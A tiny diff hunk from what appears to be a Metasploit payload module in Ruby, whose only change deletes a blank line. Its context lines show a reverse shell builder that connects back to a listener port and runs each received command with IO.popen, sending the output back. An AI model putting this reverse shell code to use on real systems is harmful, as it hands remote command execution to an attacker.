@@ -44,5 +44,4 @@ module MetasploitModule
     rbs << "\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end"
     return rbs
   end
-
 end
